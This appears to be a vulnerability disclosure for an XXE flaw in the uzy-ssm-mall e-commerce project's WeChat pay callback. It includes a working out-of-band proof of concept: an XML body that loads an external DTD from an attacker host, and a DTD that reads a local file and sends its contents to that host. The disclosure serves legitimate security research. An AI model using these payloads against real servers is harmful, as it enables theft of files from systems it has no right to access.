# There is a XXE vulnerability in **[uzy-ssm-mall](https://github.com/ghostxbh/uzy-ssm-mall)**. An attacker can register an arbitrary ordinary user to exploit this vulnerability.

path：/mall/wxpay/pay

com.uzykj.mall.controller.ForeWeixinPayController#weixin_notify() directly parses the request body into XML：

![image-20250905185322795](./images/image-20250905185322795.png)

com.uzykj.mall.util.pay.wx.util.WxpayUtil#doXMLParse() method does not disable external entities when performing XML parsing：

![image-20250905185347533](./images/image-20250905185347533.png)

No print poc：

```javap
<?xml version="1.0" encoding="UTF-8" ?>
<!DOCTYPE ANY [
<!ENTITY % xd SYSTEM 'http://192.168.32.128:8162/evil.dtd'>
    %xd;
]>
<root>&bbbb;</root>
```

evil.dtd content：

```javap
<!ENTITY % aaaa SYSTEM "file:///D:/CodeAudit/uzy-ssm-mall-master/uzy-ssm-mall-master/1.txt">
<!ENTITY % demo "<!ENTITY bbbb SYSTEM 'http://192.168.32.128:8172?file=%aaaa;'>">
%demo;
```

1.txt file contents：

![image-20250905185409062](./images/image-20250905185409062.png)

test：

![image-20250905185423648](./images/image-20250905185423648.png)

![image-20250905185514652](./images/image-20250905185514652.png)

![image-20250905185547006](./images/image-20250905185547006.png)

Read file successfully。

